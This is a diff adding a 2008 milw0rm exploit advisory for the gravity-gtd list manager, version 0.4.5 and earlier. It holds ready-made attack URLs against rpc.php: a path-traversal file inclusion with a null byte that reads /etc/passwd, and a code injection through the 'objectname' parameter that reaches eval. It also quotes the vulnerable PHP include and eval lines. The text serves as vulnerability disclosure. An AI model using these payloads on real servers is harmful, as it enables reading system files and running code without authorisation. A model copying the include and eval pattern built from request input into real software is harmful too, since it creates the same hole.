@@ -1,0 +1,41 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ #####################################################
+ #  [ gravity-gtd <= 0.4.5 ]  LFI/RCE Vulnerability  #
+ #####################################################
+ #
+ # Script: An open source list manager for tracking action items according to the principles of Getting Things Done (GTD).
+ #
+ # Download: http://sourceforge.net/projects/gravity-gtd/
+ #
+ # [LFI] Vuln: http://site.com/gravity/library/setup/rpc.php?objectname=/../../../../../../../../etc/passwd%00
+ # [RCE] Vuln: http://site.com/gravity/library/setup/rpc.php?objectname=Xmenu();phpinfo();die
+ #     
+ # Bug: ./gravity-0.4.5/library/setup/rpc.php (lines: 15-20)
+ #
+ # ...
+ #		$objectName = $_REQUEST['objectname'];
+ #
+ #
+ #		include  ("../objects/class.".strtolower($objectName).".php");				// LFI
+ #
+ #		eval ('$instance = new '.$objectName.'();');								// RCE
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-12-04]
